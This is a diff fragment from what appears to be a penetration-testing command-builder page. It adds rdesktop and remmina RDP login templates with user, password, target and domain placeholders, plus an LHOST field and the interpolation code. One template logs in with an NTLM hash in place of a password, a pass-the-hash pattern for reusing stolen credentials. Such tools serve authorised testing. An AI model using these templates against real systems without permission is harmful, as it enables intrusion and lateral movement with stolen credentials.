+      { cmd: `rdesktop -r clipboard -u {USER}@{DOMAIN} -p '{PASS}' {TARGET} -g 2530x1460 `, category: 'rdp' },
+      { cmd: `rdesktop -r clipboard -u {USER} -p '{PASS}' {TARGET} -d {DOMAIN}`, category: 'rdp' },
+      { cmd: `rdesktop -r clipboard -u {USER} -p aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 {TARGET} -d {DOMAIN}`, category: 'rdp' },
+      { cmd: `remmina -c rdp://{USER}:''{PASS}''@{DOMAIN}`, category: 'rdp' },
+      { cmd: `remmina -c rdp://{USER}''{PASS}''@{TARGET}`, category: 'rdp' },
+      { cmd: `remmina -c rdp://{DOMAIN}\\{USER}:''{PASS}''@{TARGET}`, category: 'rdp' },
     ];
 
     const $ = id => document.getElementById(id);
     const v = { 
+      LHOST: $('vLHOST'),
       TARGET: $('vTARGET'), 
       USER: $('vUSER'), 
       PASS: $('vPASS'),
@@ -235,6 +665,7 @@
     function getVars() {
       const domain = v.DOMAIN.value.trim();
       return { 
+        LHOST: v.LHOST.value.trim(),
         TARGET: v.TARGET.value.trim(), 
         USER: v.USER.value.trim(), 
         PASS: v.PASS.value.trim(),
@@ -244,7 +675,6 @@
     function interp(cmd) {
       const vars = getVars();
       let result = cmd.replace(/{(\w+)}/g, (_, k) => vars[k] || `{${k}}`);
-      // Clean up empty domain flag if domain is empty
       if (!vars.DOMAIN) {
         result = result.replace(/\s+-d\s*\{\w+\}/g, '');
         result = result.replace(/\s+-d\s*''/g, '');
